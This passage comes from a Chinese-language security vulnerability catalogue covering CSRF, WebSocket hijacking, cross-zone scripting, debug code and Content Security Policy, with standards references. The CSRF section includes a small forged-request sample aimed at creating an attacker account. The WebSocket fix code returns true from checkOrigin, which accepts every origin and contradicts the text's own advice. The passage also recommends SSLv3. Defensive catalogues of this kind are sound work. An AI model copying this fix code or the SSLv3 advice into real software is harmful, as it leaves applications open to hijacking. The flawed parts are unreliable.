<h5 id="RECOMMENDATIONS-95"><a href="#RECOMMENDATIONS-95" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要将机密数据缓存在静态类字段中，因为可从中轻松找到这些数据。 避免将密钥存储在应用程序中，但是如有必要，将其序列化并存储在专用的用户存储中，并且使用一个临时运行时随机数值模糊化/保护密钥，使从内存中轻易恢复密钥变得更加困难。</p>
<h5 id="REFERENCES-92"><a href="#REFERENCES-92" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 226 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001090, CCI-001199 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1), SC-4 Information in Shared Resources (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 8.3.4 Sensitive Private Data, 8.3.6 Sensitive Private Data </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.4, Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.4, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3230.2 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3230.2 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3230.2 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3230.2 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3230.2 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3230.2 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3230.2 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002330 CAT II, APSC-DV-002380 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Android-Bad-Practices-Leftover-Debug-Code"><a href="#Android-Bad-Practices-Leftover-Debug-Code" class="headerlink" title="Android Bad Practices: Leftover Debug Code"></a>Android Bad Practices: Leftover Debug Code</h4><h5 id="ABSTRACT-94"><a href="#ABSTRACT-94" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试代码可能影响性能或将敏感数据泄漏给攻击者。</p>
<h5 id="EXPLANATION-95"><a href="#EXPLANATION-95" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发过程中一般会为了调试或测试目的增加一些“后门”代码，这些代码不会随应用程序一起提供或部署。 如果这类调试代码无意中被保留在应用程序中，则会导致应用程序向计划外的交互模式开放。 这些后门入口点很容易产生安全隐患，因为它们不在当初的设计或者测试的考虑之内，并且不会出现在应用程序设计中的操作环境里。</p>
<h5 id="RECOMMENDATIONS-96"><a href="#RECOMMENDATIONS-96" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>务必在部署应用程序的产品版之前删除调试代码。 无论是否存在直接的安全威胁，一旦早期开发阶段结束，就没有任何理由将这样的代码保留在应用程序中。</p>
<h5 id="REFERENCES-93"><a href="#REFERENCES-93" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 489 </p>
<p>[2] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[3] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.2.2 Dependency, 14.3.2 Unintended Security Disclosure Requirements </p>
<p>[4] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6 </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.5 </p>
<p>[12] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.6 - Sensitive Data Retention </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II </p>
<h4 id="Cross-Site-Request-Forgery"><a href="#Cross-Site-Request-Forgery" class="headerlink" title="Cross-Site Request Forgery"></a>Cross-Site Request Forgery</h4><h5 id="ABSTRACT-95"><a href="#ABSTRACT-95" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTTP 请求必须包含用户特有的机密，以防止攻击者发出未经授权的请求。</p>
<h5 id="EXPLANATION-96"><a href="#EXPLANATION-96" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>跨站点伪装请求 (CSRF) 漏洞会在以下情况下发生：</p>
<ol>
<li><p>Web 应用程序使用会话 cookie。</p>
</li>
<li><p>应用程序未验证请求是否经过用户同意便处理 HTTP 请求。</p>
</li>
</ol>
<p>Nonce 是随消息一起发送的加密随机值，可防止 replay 攻击。如果该请求未包含证明其来源的 nonce，则处理该请求的代码将易受到 CSRF 攻击（除非它并未更改应用程序的状态）。这意味着使用会话 cookie 的 Web 应用程序必须采取特殊的预防措施，确保攻击者无法诱骗用户提交伪请求。假设有一个 Web 应用程序，它允许管理员创建新帐户，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, &quot;/new_user&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_username);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, new_passwd);</span><br><span class="line"></span><br><span class="line">rb.sendRequest(body, new NewAccountCallback(callback));</span><br></pre></td></tr></table></figure>
<p>攻击者可以设置一个包含以下代码的恶意网站。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, &quot;http://www.example.com/new_user&quot;);</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;attacker&quot;;</span><br><span class="line"></span><br><span class="line">body = addToPost(body, &quot;haha&quot;);</span><br><span class="line"></span><br><span class="line">rb.sendRequest(body, new NewAccountCallback(callback));</span><br></pre></td></tr></table></figure>
<p>如果 example.com 的管理员在网站上具有活动会话时访问了恶意页面，则会在毫不知情的情况下为攻击者创建一个帐户。这就是 CSRF 攻击。正是由于该应用程序无法确定请求的来源，才有可能受到 CSRF 攻击。任何请求都有可能是用户选定的合法操作，也有可能是攻击者设置的伪操作。攻击者无法查看伪请求生成的网页，因此，这种攻击技术仅适用于篡改应用程序状态的请求。</p>
<p>如果应用程序通过 URL 传递会话标识符（而不是 cookie），则不会出现 CSRF 问题，因为攻击者无法访问会话标识符，也无法在伪请求中包含会话标识符。</p>
<p>CSRF 在 2007 OWASP Top 10 排行榜上名列第 5。</p>
<h5 id="RECOMMENDATIONS-97"><a href="#RECOMMENDATIONS-97" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用会话 cookie 的应用程序必须在每个表单发布中包含几条信息，以便后端代码可以用来验证请求的来源。其中一种方法是包含随机请求标识符或 nonce，如下所示：</p>
<p>  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, “/new_user”);</p>
<p>  body = addToPost(body, new_username);</p>
<p>  body = addToPost(body, new_passwd);</p>
<p>  body = addToPost(body, request_id);</p>
<p>  rb.sendRequest(body, new NewAccountCallback(callback));</p>
<p>这样，后端逻辑可先验证请求标识符，然后再处理其他表单数据。如果可能，每个服务器请求的请求标识符都应该是唯一的，而不是在特定会话的各个请求之间共享。对于会话标识符而言，攻击者越难猜出请求标识符，则越难成功进行 CSRF 攻击。标记不应能够轻松猜出，它应以保护会话标记相同的方法得到保护，例如使用 SSLv3。</p>
<p>其他缓解技术还包括：</p>
<p>框架保护：大多数现代化的 Web 应用框架都嵌入了 CSRF 保护，它们将自动包含并验证 CSRF 标记。</p>
<p>使用质询-响应控制：强制客户响应由服务器发送的质询是应对 CSRF 的强有力防御方法。可以用于此目的的一些质询如下：CAPTCHA、密码重新验证和一次性标记。</p>
<p>检查 HTTP Referer/原始标题：攻击者在执行 CSRF 攻击时无法冒仿这些标题。这使这些标题可以用于预防 CSRF 攻击。</p>
<p>再次提交会话 Cookie：除了实际的会话 ID Cookie 外，将会话 ID Cookie 作为隐藏表单值发送是预防 CSRF 攻击的有效防护方法。服务器在处理其余表单数据之前，会先检查这些值，以确保它们完全相同。如果攻击者代表用户提交表单，他将无法根据同源策略修改会话 ID Cookie 值。</p>
<p>限制会话的有效期：当通过 CSRF 攻击访问受保护的资源时，只有当作为攻击一部分发送的会话 ID 在服务器上仍然有效时，攻击才会生效。限制会话的有效期将降低攻击成功的可能性。</p>
<p>这里所描述的技术可以使用 XSS 攻击破解。有效的 CSRF 缓解包括 XSS 缓解技术。</p>
<h5 id="REFERENCES-94"><a href="#REFERENCES-94" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</p>
<p>[2] OWASP OWASP Top 10</p>
<p>[3] OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 352</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A5 Cross Site Request Forgery (CSRF)</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A5 Cross-Site Request Forgery (CSRF)</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A8 Cross-Site Request Forgery (CSRF)</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.9</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.9</p>
<p>[15] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 352</p>
<p>[16] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 352</p>
<p>[17] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 352</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3585 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3585 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3585 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3585 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3585 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3585 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3585 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Request Forgery</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Request Forgery (WASC-09)</p>
<h4 id="Cross-Site-WebSocket-Hijacking"><a href="#Cross-Site-WebSocket-Hijacking" class="headerlink" title="Cross-Site WebSocket Hijacking"></a>Cross-Site WebSocket Hijacking</h4><h5 id="ABSTRACT-96"><a href="#ABSTRACT-96" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>服务器无法验证请求源，因此可以接收由攻击者用于劫持攻击双向 WebSocket 连接的跨域请求。</p>
<h5 id="EXPLANATION-97"><a href="#EXPLANATION-97" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当用户受诱使访问恶意站点时，该站点将与合法的后端站点建立 WebSocket 连接，这时将发生跨站 WebSocket 劫持。用于请求服务器更新到 WebSocket 协议的初始 HTTP 请求是一个常规 HTTP 请求，因此浏览器将发送任何绑定到目标域的 cookie，包括任何会话 cookie。如果服务器无法验证 Origin 头文件，它将允许任何恶意站点模拟用户并在用户不知情的情况下建立双向 WebSocket 连接。</p>
<h5 id="RECOMMENDATIONS-98"><a href="#RECOMMENDATIONS-98" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了避免 WebSocket 服务器接受跨域请求，请确保服务器验证请求 Origin 头文件。为了在 Java JSR 356 中执行此操作，应强制服务器在请求句柄中要求相同的源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import javax.websocket.server.ServerEndpointConfig.Configurator;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public class EndpointConfigurator extends Configurator &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line"></span><br><span class="line"> public boolean checkOrigin(String originHeaderValue) &#123;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-95"><a href="#REFERENCES-95" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Christian Schneider Cross-Site WebSocket Hijacking</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 352</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A5 Cross Site Request Forgery (CSRF)</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A5 Cross-Site Request Forgery (CSRF)</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A8 Cross-Site Request Forgery (CSRF)</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.9</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.9</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.9</p>
<p>[13] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 352</p>
<p>[14] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 352</p>
<p>[15] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 352</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3585 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3585 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3585 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3585 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3585 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3585 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3585 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Request Forgery</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Request Forgery (WASC-09)</p>
<h4 id="File-Based-Cross-Zone-Scripting"><a href="#File-Based-Cross-Zone-Scripting" class="headerlink" title="File Based Cross-Zone Scripting"></a>File Based Cross-Zone Scripting</h4><h5 id="ABSTRACT-97"><a href="#ABSTRACT-97" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果加载一个文件可能导致在应用程序上下文中运行不可信赖的脚本，则是很危险的。</p>
<h5 id="EXPLANATION-98"><a href="#EXPLANATION-98" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下条件时会发生 File Based Cross Zone Scripting 漏洞：</p>
<ol>
<li><p>加载一个文件，这可能会允许在您的应用程序中运行脚本</p>
</li>
<li><p>加载的脚本采用与运行的应用程序一样的来源。</p>
</li>
</ol>
<p>当满足这两个条件时，可以实现一系列攻击，尤其是当其他各方根据信息是否来自您的应用程序范围内来确定信任时。</p>
<p>例 1：以下代码使用 Android WebView 以便在本地加载文件：</p>
<p>…</p>
<p>myWebView.loadUrl(“file:/android_asset/www/index.html”); … 在上面的示例中，Android WebView 呈现器将使用 loadUrl() 通过以 “file:” 开头的 URL 加载的一切内容视为来源相同。</p>
<p>当从文件进行加载时，攻击者可以通过几种典型方法来利用 File Based Cross-Zone Scripting 漏洞：</p>
<ul>
<li><p>本地文件可能受可将脚本注入该文件的攻击者操纵。 这将取决于文件权限、文件所在位置，或者文件先保存再加载的竞争条件（可能有供进行修改的时间段）。</p>
</li>
<li><p>文件可能会调出到外部资源。 当加载的文件从外部资源检索脚本时，可能会发生这种情况。</p>
</li>
</ul>
<p>例 2：以下代码查看外部数据源，以确定它应该运行的 JavaScript。</p>
<p> <code>&lt;script src=&quot;http://www.example.com/js/fancyWidget.js&quot;/&gt;</code></p>
<p>在上面的示例中，使用了不安全的协议，这可能会允许恶意操作者修改所生成的脚本。或者，可能会执行其他攻击，以将计算机重新路由到攻击者的站点。</p>
<ul>
<li>加载的文件可能包含 cross-site scripting 漏洞。</li>
</ul>
<p>如果所加载的文件能够注入代码，则注入的代码也许能够在您的应用程序上下文中运行。这不一定是注入 JavaScript 的能力，而仅仅能够注入 HTML 也可以实现涂改或拒绝服务攻击。</p>
<h5 id="RECOMMENDATIONS-99"><a href="#RECOMMENDATIONS-99" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿加载文件，以免在您的应用程序上下文中运行脚本。当绝对不会有其他选择时，应验证该文件具有正确的权限，以确保该文件不能被攻击者修改，并且最好使用某种方法来验证该文件仅执行部分操作。 作为一种额外保护措施，最好禁用 JavaScript，这将限制攻击者在您的应用程序上下文中运行代码的范围。</p>
<h5 id="REFERENCES-96"><a href="#REFERENCES-96" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Erika Chin and David Wagner Bifocals: Analyzing WebView Vulnerabilities in Android Applications</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="HTML5-Missing-Content-Security-Policy"><a href="#HTML5-Missing-Content-Security-Policy" class="headerlink" title="HTML5: Missing Content Security Policy"></a>HTML5: Missing Content Security Policy</h4><h5 id="ABSTRACT-98"><a href="#ABSTRACT-98" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未配置内容安全策略 (CSP)。</p>
<h5 id="EXPLANATION-99"><a href="#EXPLANATION-99" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，允许开发人员规定站点可从哪些域中加载内容，或呈现在 Web 浏览器中时向哪些域发起连接。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。 </p>
<p>默认情况下，Spring Security 和其他框架不会添加内容安全策略标头。Web 应用程序作者必须声明一或多项安全策略，以针对受保护资源强制实施或监控，从而从额外的安全层获益。</p>
<h5 id="RECOMMENDATIONS-100"><a href="#RECOMMENDATIONS-100" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置内容安全策略以缓解可能的注入漏洞。</p>
<p>示例：以下代码在受 Spring Security 保护的应用程序中设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot; request-matcher=&quot;regex&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;[policy here]&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<p>内容安全策略并不用于解决所有内容注入漏洞，而是利用 CSP 来减少由内容注入攻击造成的损害。应定期执行防范编码实践，例如输入验证和输出编码。</p>
<h5 id="REFERENCES-97"><a href="#REFERENCES-97" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 1173 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
